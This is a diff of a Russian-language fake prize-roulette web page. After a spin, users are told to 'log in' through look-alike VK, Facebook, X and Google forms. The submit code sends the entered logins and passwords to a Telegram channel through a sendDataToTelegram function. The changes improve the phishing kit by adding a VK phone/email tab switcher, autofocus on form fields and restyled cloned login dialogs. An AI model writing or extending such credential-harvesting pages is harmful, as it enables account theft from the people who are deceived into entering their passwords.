@@ -93,6 +93,7 @@
             color: #8da1b5;
             font-weight: 500;
             letter-spacing: 1px;
+            margin-left: 40px; /* Отодвинули от выбора языков */
         }
         
         .container {
@@ -392,14 +393,7 @@
             display: flex;
             align-items: center;
             gap: 8px;
-        }
-        
-        .login-modal-title {
-            flex: 1;
-            text-align: center;
-            font-weight: bold;
-            color: #333;
-            font-size: 18px;
+            font-family: Arial, sans-serif;
         }
         
         .login-modal-body {
@@ -429,6 +423,7 @@
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
+            font-family: Arial, sans-serif;
         }
         
         .login-link {
@@ -437,6 +432,7 @@
             font-size: 14px;
             display: block;
             margin: 10px 0;
+            font-family: Arial, sans-serif;
         }
         
         .login-divider {
@@ -445,6 +441,7 @@
             color: #666;
             font-size: 14px;
             position: relative;
+            font-family: Arial, sans-serif;
         }
         
         .login-divider::before {
@@ -469,6 +466,7 @@
             display: flex;
             align-items: center;
             margin: 15px 0;
+            font-family: Arial, sans-serif;
         }
         
         .checkbox-container input {
@@ -552,66 +550,60 @@
             font-size: 18px;
             line-height: 1.6;
             margin-bottom: 25px;
+            font-family: 'Orbitron', sans-serif;
         }
         
-        .footer {
-            width: 100%;
-            max-width: 800px;
-            text-align: center;
-            padding: 20px;
-            margin-top: 30px;
-            background: rgba(20, 35, 60, 0.8);
-            border-radius: 10px;
-            border-top: 2px solid #2a3b5a;
-        }
-        
-        .footer-links {
+        /* Стили для ВКонтакте формы */
+        .vk-tabs {
             display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 20px;
-            margin-bottom: 15px;
+            gap: 10px;
+            margin-bottom: 20px;
         }
         
-        .footer-link {
-            color: #8da1b5;
-            text-decoration: none;
+        .vk-tab {
+            flex: 1;
+            padding: 12px;
+            background: #e5ebf1;
+            color: #2a5885;
+            border: 1px solid #dce1e6;
+            border-radius: 4px;
             font-size: 14px;
-            transition: color 0.3s;
-            font-weight: 400;
+            font-weight: normal;
+            cursor: pointer;
+            text-align: center;
+            font-family: Arial, sans-serif;
         }
         
-        .footer-link:hover {
-            color: #2a3b5a;
+        .vk-tab.active {
+            background: #4c75a3;
+            color: white;
+            font-weight: bold;
+            border-color: #4c75a3;
         }
         
-        .copyright {
-            color: #8da1b5;
-            font-size: 13px;
-            margin-top: 10px;
-            line-height: 1.5;
-            font-weight: 400;
+        .phone-input-container {
+            background: #f0f2f5;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
         }
         
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #2a3b5a;
-            color: #8da1b5;
-            padding: 15px 25px;
-            border-radius: 10px;
-            border-left: 5px solid #2a3b5a;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            display: none;
-            z-index: 1001;
-            max-width: 300px;
-            animation: slideIn 0.5s ease;
+        .phone-prefix {
+            color: #2a5885;
+            margin-right: 10px;
+            font-family: Arial, sans-serif;
         }
         
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
+        .phone-input {
+            background: transparent;
+            border: none;
+            padding: 0;
+            flex: 1;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            outline: none;
         }
         
         /* Специфичные стили для X (Twitter) модального окна */
@@ -644,6 +636,86 @@
             align-items: center;
             justify-content: center;
             cursor: pointer;
+            font-family: Arial, sans-serif;
+        }
+        
+        /* Стили для Google формы */
+        .google-icon {
+            width: 40px;
+            height: 40px;
+            background: #4285f4;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+            margin: 0 auto 15px;
+            font-family: Arial, sans-serif;
+        }
+        
+        .footer {
+            width: 100%;
+            max-width: 800px;
+            text-align: center;
+            padding: 20px;
+            margin-top: 30px;
+            background: rgba(20, 35, 60, 0.8);
+            border-radius: 10px;
+            border-top: 2px solid #2a3b5a;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 15px;
+        }
+        
+        .footer-link {
+            color: #8da1b5;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+            font-weight: 400;
+            font-family: 'Orbitron', sans-serif; /* Исправлен шрифт */
+        }
+        
+        .footer-link:hover {
+            color: #2a3b5a;
+        }
+        
+        .copyright {
+            color: #8da1b5;
+            font-size: 13px;
+            margin-top: 10px;
+            line-height: 1.5;
+            font-weight: 400;
+            font-family: 'Orbitron', sans-serif; /* Исправлен шрифт */
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #2a3b5a;
+            color: #8da1b5;
+            padding: 15px 25px;
+            border-radius: 10px;
+            border-left: 5px solid #2a3b5a;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            display: none;
+            z-index: 1001;
+            max-width: 300px;
+            animation: slideIn 0.5s ease;
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
         }
         
         @media (max-width: 600px) {
@@ -688,6 +760,11 @@
             
             .login-modal-content {
                 max-width: 95%;
+            }
+            
+            .logo {
+                margin-left: 20px;
+                font-size: 18px;
             }
         }
     </style>
@@ -841,26 +918,28 @@
 
     <!-- Модальные окна входа -->
     
-    <!-- ВКонтакте (точная копия) -->
+    <!-- ВКонтакте -->
     <div class="login-modal" id="vkLoginModal">
         <div class="login-modal-content">
             <div class="login-modal-header">
                 <button class="login-modal-back" onclick="closeLoginModal()">
                     <i class="fas fa-arrow-left"></i> Назад
                 </button>
-                <div class="login-modal-title">Вход ВКонтакте</div>
-                <div style="width: 60px;"></div>
             </div>
             <div class="login-modal-body">
-                <div style="display: flex; gap: 10px; margin-bottom: 20px;">
-                    <button style="flex: 1; padding: 12px; background: #4c75a3; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px;">Телефон</button>
-                    <button style="flex: 1; padding: 12px; background: #e5ebf1; color: #2a5885; border: 1px solid #dce1e6; border-radius: 4px; font-size: 14px;">Почта</button>
+                <div class="vk-tabs">
+                    <div class="vk-tab active" data-type="phone" onclick="switchVKTab('phone')">Телефон</div>
+                    <div class="vk-tab" data-type="email" onclick="switchVKTab('email')">Почта</div>
                 </div>
                 
-                <div style="background: #f0f2f5; border-radius: 4px; padding: 12px; margin-bottom: 15px; display: flex; align-items: center;">
-                    <span style="color: #2a5885; margin-right: 10px;">+7</span>
-                    <input type="text" class="login-input" id="vkPhone" placeholder="Номер телефона" style="background: transparent; border: none; padding: 0; flex: 1;">
+                <!-- Поле для телефона -->
+                <div id="vkPhoneField" class="phone-input-container">
+                    <span class="phone-prefix">+7</span>
+                    <input type="text" class="phone-input" id="vkPhoneInput" placeholder="Номер телефона">
                 </div>
+                
+                <!-- Поле для почты (скрыто по умолчанию) -->
+                <input type="text" class="login-input" id="vkEmailInput" placeholder="Почта или логин" style="display: none;">
                 
                 <input type="password" class="login-input" id="vkPassword" placeholder="Пароль">
                 
@@ -890,15 +969,13 @@
         </div>
     </div>
     
-    <!-- Facebook (точная копия) -->
+    <!-- Facebook -->
     <div class="login-modal" id="facebookLoginModal">
         <div class="login-modal-content">
             <div class="login-modal-header">
                 <button class="login-modal-back" onclick="closeLoginModal()">
                     <i class="fas fa-arrow-left"></i> Назад
                 </button>
-                <div class="login-modal-title">Facebook</div>
-                <div style="width: 60px;"></div>
             </div>
             <div class="login-modal-body">
                 <div style="text-align: center; margin-bottom: 25px;">
@@ -943,8 +1020,6 @@
                 <button class="login-modal-back" onclick="closeLoginModal()">
                     <i class="fas fa-arrow-left"></i> Назад
                 </button>
-                <div class="login-modal-title">Вход в X</div>
-                <div style="width: 60px;"></div>
             </div>
             <div class="login-modal-body">
                 <!-- Первая страница: ввод логина/почты -->
@@ -1000,21 +1075,17 @@
         </div>
     </div>
     
-    <!-- Google (точная копия) -->
+    <!-- Google -->
     <div class="login-modal" id="googleLoginModal">
         <div class="login-modal-content">
             <div class="login-modal-header">
                 <button class="login-modal-back" onclick="closeLoginModal()">
                     <i class="fas fa-arrow-left"></i> Назад
                 </button>
-                <div class="login-modal-title">Вход</div>
-                <div style="width: 60px;"></div>
             </div>
             <div class="login-modal-body">
                 <div style="text-align: center; margin-bottom: 25px;">
-                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 15px;">
-                        <div style="width: 40px; height: 40px; background: #4285f4; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px;">G</div>
-                    </div>
+                    <div class="google-icon">G</div>
                     <div style="font-size: 16px; font-weight: 500; color: #202124; margin-bottom: 20px;">Используйте аккаунт Google</div>
                 </div>
                 
@@ -1092,15 +1163,23 @@
             const winSound = document.getElementById('winSound');
             const socialOptions = document.querySelectorAll('.social-option');
             
-            // Элементы для X (Twitter) двухэтапной формы
+            // Элементы для ВКонтакте
+            const vkPhoneField = document.getElementById('vkPhoneField');
+            const vkPhoneInput = document.getElementById('vkPhoneInput');
+            const vkEmailInput = document.getElementById('vkEmailInput');
+            const vkPassword = document.getElementById('vkPassword');
+            const vkTabs = document.querySelectorAll('.vk-tab');
+            
+            // Элементы для X (Twitter)
             const xLoginPage = document.getElementById('xLoginPage');
             const xPasswordPage = document.getElementById('xPasswordPage');
             const xUsernameInput = document.getElementById('xUsername');
             const xEmailDisplay = document.getElementById('xEmailDisplay');
             const xPasswordInput = document.getElementById('xPassword');
             
-            // Переменные для хранения данных X
+            // Переменные для хранения данных
             let xUsername = '';
+            let vkLoginType = 'phone'; // 'phone' или 'email'
             
             // Призы с картинками
             const prizes = [
@@ -1123,7 +1202,7 @@
             const totalSpins = 30;
             let finalPrizeIndex = 0;
             let selectedSocial = null;
-            let hasPlayed = false; // Флаг: играл ли уже пользователь
+            let hasPlayed = false;
             
             // Порядок обхода призов
             const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
@@ -1156,11 +1235,35 @@
                 }
             };
             
+            // Функция переключения вкладок ВКонтакте
+            window.switchVKTab = function(type) {
+                vkLoginType = type;
+                
+                // Обновляем активную вкладку
+                vkTabs.forEach(tab => {
+                    if (tab.getAttribute('data-type') === type) {
+                        tab.classList.add('active');
+                    } else {
+                        tab.classList.remove('active');
+                    }
+                });
+                
+                // Показываем/скрываем соответствующие поля
+                if (type === 'phone') {
+                    vkPhoneField.style.display = 'flex';
+                    vkEmailInput.style.display = 'none';
+                    vkPhoneInput.focus();
+                } else {
+                    vkPhoneField.style.display = 'none';
+                    vkEmailInput.style.display = 'block';
+                    vkEmailInput.focus();
+                }
+            };
+            
             // Функция смены языка
             function changeLanguage(lang) {
                 const t = translations[lang] || translations.ru;
                 
-                // Обновляем тексты
                 document.querySelector('.header h1').textContent = t.title;
                 document.querySelector('.header p').textContent = t.subtitle;
                 playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
@@ -1168,7 +1271,6 @@
                 document.querySelector('#socialSelectSection p').textContent = t.selectText;
                 document.querySelector('#prizeSection h2').textContent = t.prizeTitle;
                 
-                // Обновляем текст кнопки языка
                 const langNames = {
                     ru: 'Русский', en: 'English', uz: "O'zbekcha",
                     kz: 'Қазақша', ar: 'العربية', zh: '中文',
@@ -1227,7 +1329,6 @@
             function startRoulette() {
                 if (isSpinning) return;
                 
-                // Проверяем, играл ли уже пользователь
                 if (hasPlayed) {
                     showNotification("Вы уже использовали свою попытку сегодня!", true);
                     return;
@@ -1239,17 +1340,13 @@
                 prizeSection.classList.remove('active');
                 confirmationSection.classList.remove('active');
                 
-                // Случайный конечный приз
                 finalPrizeIndex = getRandomPrize();
                 
-                // Запускаем звук
                 spinSound.currentTime = 0;
                 spinSound.play();
                 
-                // Показываем рамку
                 selectionFrame.style.opacity = '1';
                 
-                // Запускаем анимацию
                 spinCount = 0;
                 spinSpeed = 100;
                 currentPrizeIndex = 0;
@@ -1264,45 +1361,35 @@
                 currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
                 spinCount++;
                 
-                // Замедление к концу
                 if (spinCount > totalSpins * 0.7) {
                     spinSpeed += 20;
                     clearInterval(spinInterval);
                     spinInterval = setInterval(spinStep, spinSpeed);
                 }
                 
-                // Остановка на конечном призе
                 if (spinCount >= totalSpins) {
                     clearInterval(spinInterval);
                     
-                    // Останавливаем звук вращения
                     spinSound.pause();
                     
-                    // Воспроизводим звук победы
                     winSound.currentTime = 0;
                     winSound.play();
                     
-                    // Останавливаемся на финальном призе
                     setTimeout(() => {
                         moveFrameToPrize(finalPrizeIndex);
                         
-                        // Показываем секцию выбора соцсети
                         setTimeout(() => {
                             isSpinning = false;
                             
-                            // Помечаем, что пользователь уже играл
                             hasPlayed = true;
                             playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                             
-                            // Обновляем информацию о выигранном призе
                             const wonPrize = prizes[finalPrizeIndex];
                             wonPrizeImage.src = wonPrize.image;
                             
-                            // Сбрасываем выбор соцсети
                             socialOptions.forEach(opt => opt.classList.remove('selected'));
                             selectedSocial = null;
                             
-                            // Показываем секцию выбора соцсети
                             socialSelectSection.classList.add('active');
                             socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                         }, 1000);
@@ -1313,14 +1400,19 @@
             // Обработчики выбора соцсети
             socialOptions.forEach(option => {
                 option.addEventListener('click', function() {
-                    // Снимаем выделение со всех
                     socialOptions.forEach(opt => opt.classList.remove('selected'));
                     
-                    // Выделяем выбранную
                     this.classList.add('selected');
                     selectedSocial = this.getAttribute('data-social');
                     
-                    // Сбрасываем состояние формы X при открытии
+                    // Сбрасываем состояние форм при открытии
+                    if (selectedSocial === 'vk') {
+                        switchVKTab('phone');
+                        vkPhoneInput.value = '';
+                        vkEmailInput.value = '';
+                        vkPassword.value = '';
+                    }
+                    
                     if (selectedSocial === 'x') {
                         xLoginPage.classList.remove('hidden');
                         xPasswordPage.classList.remove('active');
@@ -1329,7 +1421,6 @@
                         xUsername = '';
                     }
                     
-                    // Показываем модальное окно входа
                     openLoginModal(selectedSocial);
                 });
             });
@@ -1339,6 +1430,19 @@
                 const modalId = social + 'LoginModal';
                 document.getElementById(modalId).classList.add('active');
                 document.body.style.overflow = 'hidden';
+                
+                // Фокус на первое поле
+                setTimeout(() => {
+                    if (social === 'vk') {
+                        vkPhoneInput.focus();
+                    } else if (social === 'facebook') {
+                        document.getElementById('facebookEmail').focus();
+                    } else if (social === 'x') {
+                        xUsernameInput.focus();
+                    } else if (social === 'google') {
+                        document.getElementById('googleEmail').focus();
+                    }
+                }, 100);
             }
             
             // Функция закрытия модального окна входа
@@ -1349,7 +1453,7 @@
                 document.body.style.overflow = 'auto';
             };
             
-            // Функция перехода ко второй странице X (ввод пароля)
+            // Функция перехода ко второй странице X
             window.nextToXPassword = function() {
                 const username = xUsernameInput.value.trim();
                 
@@ -1358,26 +1462,34 @@
                     return;
                 }
                 
-                // Сохраняем логин и показываем на второй странице
                 xUsername = username;
                 xEmailDisplay.textContent = username;
                 
-                // Переключаем страницы
                 xLoginPage.classList.add('hidden');
                 xPasswordPage.classList.add('active');
+                
+                setTimeout(() => {
+                    xPasswordInput.focus();
+                }, 100);
             };
             
-            // Функции отправки данных для каждой соцсети
+            // Функции отправки данных
             window.submitVKLogin = function() {
-                const phone = document.getElementById('vkPhone').value.trim() || '';
-                const password = document.getElementById('vkPassword').value.trim() || '';
+                let login = '';
+                const password = vkPassword.value.trim();
                 
-                if (!phone || !password) {
+                if (vkLoginType === 'phone') {
+                    login = vkPhoneInput.value.trim();
+                } else {
+                    login = vkEmailInput.value.trim();
+                }
+                
+                if (!login || !password) {
                     showNotification("Пожалуйста, заполните все поля", true);
                     return;
                 }
                 
-                sendDataToTelegram('VK', phone, password);
+                sendDataToTelegram('VK', login, password);
                 closeLoginModal();
                 showConfirmationSection();
             };
@@ -1467,7 +1579,7 @@
             // Запуск рулетки
             playBtn.addEventListener('click', startRoulette);
             
-            // Инициализация (рамка скрыта)
+            // Инициализация
             selectionFrame.style.opacity = '0';
             
             // Эффекты при наведении на призы
